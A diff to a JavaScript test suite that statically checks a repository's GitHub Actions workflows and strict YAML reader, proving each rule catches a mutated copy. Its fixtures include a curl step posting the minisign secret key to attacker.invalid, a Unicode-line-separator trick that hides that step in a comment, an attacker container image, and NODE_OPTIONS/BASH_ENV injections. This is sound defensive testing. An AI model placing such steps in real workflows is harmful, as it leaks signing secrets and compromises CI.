@@ -1,4 +1,4 @@
-// Static tests of the three workflows (plan task 1.8, rules C-WF1 to C-WF11) and of the strict YAML reader they are read with.
+// Static tests of the three workflows (plan task 1.8, rules C-WF1 to C-WF12) and of the strict YAML reader they are read with.
 // Every rule passes on this repository's own .github/workflows, and every rule is shown failing on a copy broken one way per case
 // (a mutant), so each failing case proves that its rule sees exactly that change. Nothing here runs a workflow, a network request or
 // a tool of task 1.7; the rules read the files only.
@@ -70,12 +70,16 @@ function mutant(edits) {
   return loadWorkflows(t);
 }
 
-/** The rule passes on the real workflows and reports a problem matching `re` on the mutant. */
+/** The rule passes on the real workflows and reports a problem matching `re` on the mutant (each of them, for a list). */
 function refuses(rule, edits, re) {
   assert.deepEqual(RULES[rule](real), [], `${rule} passes on the real workflows`);
   const problems = RULES[rule](mutant(edits));
-  assert.ok(problems.some((p) => re.test(p)), `${rule}: expected a problem matching ${re}, got ${JSON.stringify(problems)}`);
+  for (const r of [re].flat()) assert.ok(problems.some((p) => r.test(p)), `${rule}: expected a problem matching ${r}, got ${JSON.stringify(problems)}`);
 }
+
+// A step that hands the index key to the network, in both sign jobs alike: the change C-WF7's step pins exist for.
+const CURL_STEP = '      - name: Report\n        env:\n          K: ${{ secrets.MINISIGN_INDEX_KEY }}\n        run: curl -d "$K" https://attacker.invalid/\n';
+const MINISIGN_STEP = "      - name: Install minisign (Ubuntu's package)\n";
 
 describe('YS: the strict YAML subset reader', () => {
   const bad = (src, re) => assert.throws(() => parseYaml(src), (e) => e instanceof YamlSubsetError && re.test(e.message));
@@ -141,6 +145,30 @@ describe('YS: the strict YAML subset reader', () => {
     bad('a: 1\r\n', /carriage return/);
     bad('- a\n', /mapping/);
   });
+
+  // YAML 1.1 readers (YamlDotNet's IsBreak among them) take these three as line breaks and this reader would not, so a step written
+  // after one inside a comment line would be hidden from the rules and read as a step by such a reader. They are refused on any
+  // line, whatever GitHub's reader does with them.
+  for (const [u, c] of [['U+0085', '\u0085'], ['U+2028', '\u2028'], ['U+2029', '\u2029']]) {
+    test(`YAML ${u} is refused on any line`, () => {
+      const at = (n) => new RegExp(`^line ${n}: ${u.replace('+', '\\+')}`);
+      bad(`a: x${c}y\n`, at(1));
+      bad(`a: 1\n# note${c}b: 2\n`, at(2));
+      bad(`a: |\n  x\n  y${c}\n`, at(3));
+      bad(`a: 1\nb: 2${c}`, at(2));
+    });
+  }
+
+  test('YAML a secret step hidden after U+2028 in a comment line of both sign jobs fails every rule', () => {
+    const hidden = `      # note\u2028${CURL_STEP.replace(/\n(?=.)/g, '\u2028')}`;
+    const ws = mutant(['publish.yml', 'resign.yml'].map((file) => ({ file, job: 'sign', from: MINISIGN_STEP, to: hidden + MINISIGN_STEP })));
+    for (const [rule, fn] of Object.entries(RULES)) {
+      const problems = fn(ws);
+      for (const f of ['publish.yml', 'resign.yml']) {
+        assert.ok(problems.some((p) => new RegExp(`^${f.replace('.', '\\.')}: line \\d+: U\\+2028`).test(p)), `${rule} reports the U+2028 in ${f}: ${JSON.stringify(problems)}`);
+      }
+    }
+  });
 });
 
 describe('C-WF1 triggers', () => {
@@ -196,6 +224,11 @@ describe('C-WF5 secrets, variables and permissions', () => {
   test('C-WF5 refuses a mirror variable outside mirror', () => refuses('C-WF5', [{ file: 'publish.yml', job: 'verify', from: '      TARGET: ${{ inputs.target }}\n', to: '      TARGET: ${{ inputs.target }}\n      B: ${{ vars.R2_BUCKET }}\n' }], /job verify: variable R2_BUCKET/));
   test('C-WF5 refuses another variable', () => refuses('C-WF5', [{ file: 'publish.yml', job: 'upload', from: '          R2_BUCKET: ${{ vars.R2_BUCKET }}\n', to: '          R2_BUCKET: ${{ vars.OTHER }}\n' }], /variable OTHER/));
   test('C-WF5 refuses bracket access to secrets', () => refuses('C-WF5', [{ file: 'publish.yml', job: 'sign', from: '${{ secrets.MINISIGN_INDEX_KEY }}', to: "${{ secrets['MINISIGN_INDEX_KEY'] }}" }], /secrets\[/));
+  test('C-WF5 refuses a container on a job', () => refuses('C-WF5', [{ file: 'publish.yml', job: 'upload', from: '    environment: mirror\n', to: '    environment: mirror\n    container: ghcr.io/attacker/image:latest\n' }], /^publish\.yml job upload: container/));
+  test('C-WF5 refuses services on a job', () => refuses('C-WF5', [{ file: 'publish.yml', job: 'upload', from: '    environment: mirror\n', to: '    environment: mirror\n    services:\n      x:\n        image: ghcr.io/attacker/image:latest\n' }], /^publish\.yml job upload: services/));
+  test('C-WF5 refuses a self-hosted runner', () => refuses('C-WF5', [{ file: 'publish.yml', job: 'upload', from: '    runs-on: ubuntu-24.04\n', to: '    runs-on: self-hosted\n' }], /^publish\.yml job upload: runs-on "self-hosted", expected ubuntu-24\.04/));
+  test('C-WF5 refuses a runner list', () => refuses('C-WF5', [{ file: 'check.yml', job: 'review', from: '    runs-on: ubuntu-24.04\n', to: '    runs-on: [ubuntu-24.04, self-hosted]\n' }], /^check\.yml job review: runs-on/));
+  test('C-WF5 refuses env at workflow level', () => refuses('C-WF5', [{ file: 'publish.yml', from: '\nconcurrency:\n', to: '\nenv:\n  NODE_OPTIONS: --require=/tmp/x.js\nconcurrency:\n' }], /^publish\.yml: env at workflow level/));
 });
 
 describe('C-WF6 workflow-level concurrency', () => {
@@ -222,6 +255,10 @@ describe('C-WF7 the two sign jobs', () => {
   test('C-WF7 refuses a head artifact kept 30 days', () => refuses('C-WF7', [{ file: 'publish.yml', job: 'build', from: '          name: head\n          path: ${{ runner.temp }}/work/index/index.json\n          if-no-files-found: error\n          retention-days: 90\n', to: '          name: head\n          path: ${{ runner.temp }}/work/index/index.json\n          if-no-files-found: error\n          retention-days: 30\n' }], /artifact head.*retention-days 90/));
   test('C-WF7 refuses a catalog artifact without retention', () => refuses('C-WF7', [{ file: 'resign.yml', job: 'head', from: '          name: catalog\n          path: ${{ runner.temp }}/work/index/catalog/\n          if-no-files-found: error\n          retention-days: 90\n', to: '          name: catalog\n          path: ${{ runner.temp }}/work/index/catalog/\n          if-no-files-found: error\n' }], /artifact catalog/));
   test('C-WF7 refuses an artifact it does not know', () => refuses('C-WF7', [{ file: 'publish.yml', job: 'build', from: '          name: archives.json\n', to: '          name: archives\n' }], /artifact archives /));
+  const pinned = (f) => new RegExp(`^${f.replace('.', '\\.')} job sign(?: step \\d+)?: .*pinned`);
+  test('C-WF7 refuses an added curl step in both sign jobs', () => refuses('C-WF7', both(MINISIGN_STEP, CURL_STEP + MINISIGN_STEP), [pinned('publish.yml'), pinned('resign.yml'), /^publish\.yml job sign step 6: "Report"/, /^resign\.yml job sign step 6: "Report"/]));
+  test('C-WF7 refuses an env added to a pinned step in both sign jobs', () => refuses('C-WF7', both(`${MINISIGN_STEP}        run: |\n`, `${MINISIGN_STEP}        env:\n          BASH_ENV: /tmp/x\n        run: |\n`), [/^publish\.yml job sign step 6: "Install minisign \(Ubuntu's package\)" sha256 [0-9a-f]{64}, pinned/, /^resign\.yml job sign step 6: "Install minisign/]));
+  test('C-WF7 refuses a removed step in both sign jobs', () => refuses('C-WF7', both('      - name: Shred the secret key file\n        if: always()\n        run: |\n          if [ -e "$RUNNER_TEMP/sign/key" ]; then shred -u "$RUNNER_TEMP/sign/key"; fi\n          [ ! -e "$RUNNER_TEMP/sign/key" ]\n\n', ''), [/^publish\.yml job sign: 10 steps, the pinned list has 11/, /^resign\.yml job sign: 10 steps/]));
 });
 
 describe('C-WF8 target test never reaches index', () => {
@@ -260,7 +297,7 @@ describe('C-WF11 no reviewer is written in the repository; it is read from the e
   test('C-WF11 refuses a reviewer input', () => refuses('C-WF11', [{ file: 'publish.yml', from: '      repair:\n', to: '      reviewer:\n        type: string\n      repair:\n' }], /publish\.yml: names a reviewer outside a comment/));
   test('C-WF11 refuses a user id literal in a workflow', () => refuses('C-WF11', [{ file: 'resign.yml', job: 'check', from: '    timeout-minutes: 30\n', to: '    timeout-minutes: 30\n    env:\n      OWNER_ID: 98765432\n' }], /resign\.yml: a user id or login written as a literal \(line \d+\)/));
   test('C-WF11 refuses an actor compared with a literal in a workflow', () => refuses('C-WF11', [{ file: 'resign.yml', job: 'check', from: '    timeout-minutes: 30\n', to: "    timeout-minutes: 30\n    if: ${{ github.actor_id == '98765432' }}\n" }], /resign\.yml: a user id or login written as a literal/));
-  test('C-WF11 refuses a login compared with a literal in a workflow', () => refuses('C-WF11', [{ file: 'publish.yml', job: 'verify', from: '    timeout-minutes: 120\n', to: "    timeout-minutes: 120\n    if: ${{ github.triggering_actor == 'someone' }}\n" }], /publish\.yml: a user id or login written as a literal/));
+  test('C-WF11 refuses a login compared with a literal in a workflow', () => refuses('C-WF11', [{ file: 'publish.yml', job: 'build', from: '    timeout-minutes: 120\n', to: "    timeout-minutes: 120\n    if: ${{ github.triggering_actor == 'someone' }}\n" }], /publish\.yml: a user id or login written as a literal/));
   test('C-WF11 refuses a user id compared with a literal in a tool', () => refuses('C-WF11', [ab('const mine = (a) => a.user.id === 98765432;')], /tools\/approved-base\.mjs: a user id or login written as a literal/));
   test('C-WF11 refuses a literal compared with a user id in a tool', () => refuses('C-WF11', [ab("const mine = (a) => '98765432' == a.user?.id;")], /tools\/approved-base\.mjs: a user id or login written as a literal/));
   test('C-WF11 refuses a login compared with a literal in a tool', () => refuses('C-WF11', [ab("const mine = (a) => a.user.login === 'someone';")], /tools\/approved-base\.mjs: a user id or login written as a literal/));
@@ -273,4 +310,18 @@ describe('C-WF11 no reviewer is written in the repository; it is read from the e
   test('C-WF11 refuses lib/reviewer.mjs reading a file', () => refuses('C-WF11', [{ path: 'tools/lib/reviewer.mjs', from: '// tools/lib/reviewer.mjs:', to: "import fs from 'node:fs';\n// tools/lib/reviewer.mjs:" }], /tools\/lib\/reviewer\.mjs: imports node:fs/));
   test('C-WF11 refuses lib/reviewer.mjs loading code at run time', () => refuses('C-WF11', [{ path: 'tools/lib/reviewer.mjs', from: '// tools/lib/reviewer.mjs:', to: "const m = await import('node:child_process');\n// tools/lib/reviewer.mjs:" }], /tools\/lib\/reviewer\.mjs: loads a module at run time/));
   test('C-WF11 refuses a missing lib/reviewer.mjs', () => refuses('C-WF11', [{ path: 'tools/lib/reviewer.mjs', text: null }], /tools\/lib\/reviewer\.mjs: missing/));
+});
+
+describe('C-WF12 a job after a job that can be skipped carries its own if', () => {
+  const VERIFY_IF_LINE = "    if: ${{ !cancelled() && needs.upload.result == 'success' }}\n";
+  const verify = (from, to) => [{ file: 'publish.yml', job: 'verify', from, to }];
+  test('C-WF12 the real workflows pass', () => assert.deepEqual(RULES['C-WF12'](real), []));
+  test('C-WF12 refuses verify without if (one of sign and sign-test is skipped in every run)', () => refuses('C-WF12', verify(VERIFY_IF_LINE, ''), [/^publish\.yml job verify: no if, so GitHub skips it whenever sign, sign-test or upload is skipped/, /^publish\.yml job verify: needs must be exactly \[upload\]/]));
+  test('C-WF12 refuses verify with if: false', () => refuses('C-WF12', verify(VERIFY_IF_LINE, '    if: false\n'), [/^publish\.yml job verify: if must have !cancelled\(\) as a top-level && term/, /if does not require needs\.upload\.result == 'success'/]));
+  test('C-WF12 refuses verify with if: success()', () => refuses('C-WF12', verify(VERIFY_IF_LINE, '    if: success()\n'), [/^publish\.yml job verify: if calls success\(\)/, /^publish\.yml job verify: if must have !cancelled\(\)/]));
+  test('C-WF12 refuses verify with an || around !cancelled()', () => refuses('C-WF12', verify(VERIFY_IF_LINE, "    if: ${{ !cancelled() && needs.upload.result == 'success' || inputs.repair }}\n"), /^publish\.yml job verify: if must have !cancelled\(\) as a top-level && term/));
+  test('C-WF12 refuses verify without needs (it would read the old live index)', () => refuses('C-WF12', verify('    needs: upload\n', ''), /^publish\.yml job verify: needs must be exactly \[upload\]/));
+  test('C-WF12 refuses a needs that names no job', () => refuses('C-WF12', [{ file: 'check.yml', job: 'review', from: '    needs: verify-vendor\n', to: '    needs: [verify-vendor, lint]\n' }], /^check\.yml job review: needs lint, not a job of check\.yml/));
+  test('C-WF12 refuses a conditional job before jobs with the default if', () => refuses('C-WF12', [{ file: 'check.yml', job: 'verify-vendor', from: '    timeout-minutes: 15\n', to: '    timeout-minutes: 15\n    if: ${{ github.event.pull_request.draft == false }}\n' }], [/^check\.yml job checks: no if/, /^check\.yml job review: no if/]));
+  test('C-WF12 counts the whole needs chain, not only the jobs named (resign.yml check before the head gate)', () => refuses('C-WF12', [{ file: 'resign.yml', job: 'check', from: '    timeout-minutes: 30\n', to: "    timeout-minutes: 30\n    if: ${{ github.event_name == 'schedule' }}\n" }], [/^resign\.yml job sign: no if, so GitHub skips it whenever check is skipped/, /^resign\.yml job verify: no if, so GitHub skips it whenever check is skipped/]));
 });
